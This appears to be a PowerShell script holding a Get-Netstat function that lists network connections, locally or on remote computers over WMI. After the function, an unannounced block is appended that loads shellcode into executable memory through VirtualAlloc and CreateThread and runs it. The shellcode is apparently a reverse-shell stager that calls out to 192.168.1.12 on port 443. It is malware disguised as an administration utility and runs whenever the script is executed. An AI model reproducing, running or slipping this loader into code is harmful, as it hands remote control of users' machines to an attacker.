function Get-Netstat {
    	
	[OutputType('System.Management.Automation.PSObject')]
	[CmdletBinding()]
	param(
		
		[Parameter(Position=0)]
		[System.String]$ProcessName='*',
		
		[Parameter(Position=1)]
		[System.String]$Address='*',		
		
		[Parameter(Position=2)]
		$Port='*',

		[Parameter(Position=3,
                   ValueFromPipeline = $True,
                   ValueFromPipelineByPropertyName = $True)]
        [System.String[]]$ComputerName=$env:COMPUTERNAME,

		[ValidateSet('*','tcp','udp')]
		[System.String]$Protocol='*',

		[ValidateSet('*','Closed','Close_Wait','Closing','Delete_Tcb','DeleteTcb','Established','Fin_Wait_1','Fin_Wait_2','Last_Ack','Listening','Syn_Received','Syn_Sent','Time_Wait','Unknown')]
		[System.String]$State='*',

        [switch]$ShowHostnames,
        
        [switch]$ShowProcessNames = $true,	

        [System.String]$TempFile = "C:\netstat.txt",

        [validateset('*','IPv4','IPv6')]
        [string]$AddressFamily = '*'
	)
    
	begin{
        
            $properties = 'ComputerName','Protocol','LocalAddress','LocalPort','RemoteAddress','RemotePort','State','ProcessName','PID'

        
            $dnsCache = @{}
            
	}
	
	process{

        foreach($Computer in $ComputerName) {

            
            if($ShowProcessNames){
                Try {
                    $processes = Get-Process -ComputerName $Computer -ErrorAction stop | select name, id
                }
                Catch {
                    Write-warning "Could not run Get-Process -computername $Computer.  Verify permissions and connectivity.  Defaulting to no ShowProcessNames"
                    $ShowProcessNames = $false
                }
            }
	    
            
                if($Computer -ne $env:COMPUTERNAME){

                    
                        [string]$cmd = "cmd /c c:\windows\system32\netstat.exe -ano >> $tempFile"
            
                    
                        $remoteTempFile = "\\{0}\{1}`${2}" -f "$Computer", (split-path $tempFile -qualifier).TrimEnd(":"), (Split-Path $tempFile -noqualifier)

                    
                        Try{
                            $null = Invoke-WmiMethod -class Win32_process -name Create -ArgumentList "cmd /c del $tempFile" -ComputerName $Computer -ErrorAction stop
                        }
                        Catch{
                            Write-Warning "Could not invoke create win32_process on $Computer to delete $tempfile"
                        }

                    
                        Try{
                            $processID = (Invoke-WmiMethod -class Win32_process -name Create -ArgumentList $cmd -ComputerName $Computer -ErrorAction stop).processid
                        }
                        Catch{
                            
                            Throw $_
                            Break
                        }

                    
                        while (
                            
                                $(
                                    try{
                                        get-process -id $processid -computername $Computer -ErrorAction Stop
                                    }
                                    catch{
                                        $FALSE
                                    }
                                )
                        ) {
                            start-sleep -seconds 2 
                        }
            
                    
                        if(test-path $remoteTempFile){
                    
                            Try {
                                $results = Get-Content $remoteTempFile | Select-String -Pattern '\s+(TCP|UDP)'
                            }
                            Catch {
                                Throw "Could not get content from $remoteTempFile for results"
                                Break
                            }

                            Remove-Item $remoteTempFile -force

                        }
                        else{
                            Throw "'$tempFile' on $Computer converted to '$remoteTempFile'.  This path is not accessible from your system."
                            Break
                        }
                }
                else{
                    
                        $results = netstat -ano | Select-String -Pattern '\s+(TCP|UDP)'
                }

            
                $totalCount = $results.count
                $count = 0
    
            
	            foreach($result in $results) {
            
    	            $item = $result.line.split(' ',[System.StringSplitOptions]::RemoveEmptyEntries)
    
    	            if($item[1] -notmatch '^\[::'){
                    
                        
    	                    if (($la = $item[1] -as [ipaddress]).AddressFamily -eq 'InterNetworkV6'){
    	                        $localAddress = $la.IPAddressToString
    	                        $localPort = $item[1].split('\]:')[-1]
    	                    }
    	                    else {
    	                        $localAddress = $item[1].split(':')[0]
    	                        $localPort = $item[1].split(':')[-1]
    	                    }
                    
                        
    	                    if (($ra = $item[2] -as [ipaddress]).AddressFamily -eq 'InterNetworkV6'){
    	                        $remoteAddress = $ra.IPAddressToString
    	                        $remotePort = $item[2].split('\]:')[-1]
    	                    }
    	                    else {
    	                        $remoteAddress = $item[2].split(':')[0]
    	                        $remotePort = $item[2].split(':')[-1]
    	                    }

                        
                            if($AddressFamily -ne "*")
                            {
                                if($AddressFamily -eq 'IPv4' -and $localAddress -match ':' -and $remoteAddress -match ':|\*' )
                                {
                                    
                                    Write-Verbose "Filtered by AddressFamily:`n$result"
                                    continue
                                }
                                elseif($AddressFamily -eq 'IPv6' -and $localAddress -notmatch ':' -and ( $remoteAddress -notmatch ':' -or $remoteAddress -match '*' ) )
                                {
                                    
                                    Write-Verbose "Filtered by AddressFamily:`n$result"
                                    continue
                                }
                            }
    	    		
                        
    	    		        $procId = $item[-1]
    	    		        $proto = $item[0]
    	    		        $status = if($item[0] -eq 'tcp') {$item[3]} else {$null}	

                        
		    		        if($remotePort -notlike $Port -and $localPort -notlike $Port){
                                write-verbose "remote $Remoteport local $localport port $port"
                                Write-Verbose "Filtered by Port:`n$result"
                                continue
		    		        }

		    		        if($remoteAddress -notlike $Address -and $localAddress -notlike $Address){
                                Write-Verbose "Filtered by Address:`n$result"
                                continue
		    		        }
    	    			     
    	    			    if($status -notlike $State){
                                Write-Verbose "Filtered by State:`n$result"
                                continue
		    		        }

    	    			    if($proto -notlike $Protocol){
                                Write-Verbose "Filtered by Protocol:`n$result"
                                continue
		    		        }
                   
                        
                            Write-Progress  -Activity "Resolving host and process names"`
                                -Status "Resolving process ID $procId with remote address $remoteAddress and local address $localAddress"`
                                -PercentComplete (( $count / $totalCount ) * 100)
    	    		
                        
                            if($ShowProcessNames -or $PSBoundParameters.ContainsKey -eq 'ProcessName'){
                        
                                
                                if($procName = $processes | Where {$_.id -eq $procId} | select -ExpandProperty name ){ }
                                else {$procName = "Unknown"}

                            }
                            else{$procName = "NA"}

		    		        if($procName -notlike $ProcessName){
                                Write-Verbose "Filtered by ProcessName:`n$result"
                                continue
		    		        }
    	    						
                        
                            if($showHostnames){
                                $tmpAddress = $null
                                try{
                                    if($remoteAddress -eq "127.0.0.1" -or $remoteAddress -eq "0.0.0.0"){
                                        $remoteAddress = $Computer
                                    }
                                    elseif($remoteAddress -match "\w"){
                                        
                                        
                                            if ($dnsCache.containskey( $remoteAddress)) {
                                                $remoteAddress = $dnsCache[$remoteAddress]
                                                write-verbose "using cached REMOTE '$remoteAddress'"
                                            }
                                            else{
                                                
                                                    $tmpAddress = $remoteAddress
                                                    $remoteAddress = [System.Net.DNS]::GetHostByAddress("$remoteAddress").hostname
                                                    $dnsCache.add($tmpAddress, $remoteAddress)
                                                    write-verbose "using non cached REMOTE '$remoteAddress`t$tmpAddress"
                                            }
                                    }
                                }
                                catch{ }

                                try{

                                    if($localAddress -eq "127.0.0.1" -or $localAddress -eq "0.0.0.0"){
                                        $localAddress = $Computer
                                    }
                                    elseif($localAddress -match "\w"){
                                        
                                            if($dnsCache.containskey($localAddress)){
                                                $localAddress = $dnsCache[$localAddress]
                                                write-verbose "using cached LOCAL '$localAddress'"
                                            }
                                            else{
                                                
                                                    $tmpAddress = $localAddress
                                                    $localAddress = [System.Net.DNS]::GetHostByAddress("$localAddress").hostname
                                                    $dnsCache.add($localAddress, $tmpAddress)
                                                    write-verbose "using non cached LOCAL '$localAddress'`t'$tmpAddress'"
                                            }
                                    }
                                }
                                catch{ }
                            }
    
    	    		    
    	    		        New-Object -TypeName PSObject -Property @{
		    		            ComputerName = $Computer
                                PID = $procId
		    		            ProcessName = $procName
		    		            Protocol = $proto
		    		            LocalAddress = $localAddress
		    		            LocalPort = $localPort
		    		            RemoteAddress =$remoteAddress
		    		            RemotePort = $remotePort
		    		            State = $status
		    	            } | Select-Object -Property $properties								

                        
                            $count++
                    }
                }
        }
    }
}
$zHI = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $zHI -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x0c,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$tzF=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($tzF.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$tzF,0,0,0);for (;;){Start-sleep 60};

